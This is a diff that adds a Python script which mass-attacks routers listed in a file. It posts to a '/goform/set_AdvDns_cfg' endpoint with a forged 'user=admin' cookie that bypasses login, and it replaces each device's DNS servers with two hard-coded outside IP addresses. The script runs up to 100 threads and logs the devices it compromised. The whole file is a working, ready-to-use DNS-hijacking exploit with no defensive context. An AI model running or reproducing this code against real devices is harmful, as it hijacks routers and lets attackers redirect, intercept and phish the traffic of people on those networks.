@@ -1,0 +1,67 @@
+import requests
+import threading
+
+MAX_THREADS = 100
+
+def read_ip_port_from_file(filename):
+    try:
+        with open(filename, 'r') as file:
+            ip_port = file.read().strip()
+        return ip_port
+    except FileNotFoundError:
+        return None
+
+def send_request(ip_port):
+    if ip_port is None:
+        return None
+    url = f'http://{ip_port}/goform/set_AdvDns_cfg'
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
+        'Cookie': 'platform=0; user=admin'
+    }
+    payload = {
+        'status': '1',
+        'dns1': '79.137.248.21',
+        'dns2': '89.208.105.113'
+    }
+    try:
+        response = requests.post(url, headers=headers, data=payload, timeout=10)  # Timeout set to 10 seconds
+        return response.text
+    except requests.exceptions.RequestException as e:
+        return None
+
+def check_login(response_body):
+    if response_body is not None and '{"type":"setdnsinfo","result":0}' in response_body:
+        return True
+    return False
+
+def process_ip(ip_port):
+    response_body = send_request(ip_port)
+    if check_login(response_body):
+        print(f"Login successful to: {ip_port}")
+
+def main():
+    ip_port = read_ip_port_from_file('ips.txt')
+    if ip_port is None:
+        return
+    
+    # Splitting the IP:PORT string by newline character
+    ip_port_list = ip_port.split('\n')
+    
+    # Using threading to process each IP:PORT
+    threads = []
+    for ip_port in ip_port_list:
+        if ip_port.strip():  # Ignore empty lines
+            # Limiting the number of active threads to MAX_THREADS
+            while threading.active_count() >= MAX_THREADS:
+                continue
+            thread = threading.Thread(target=process_ip, args=(ip_port,))
+            thread.start()
+            threads.append(thread)
+    
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join()
+
+if __name__ == "__main__":
+    main()
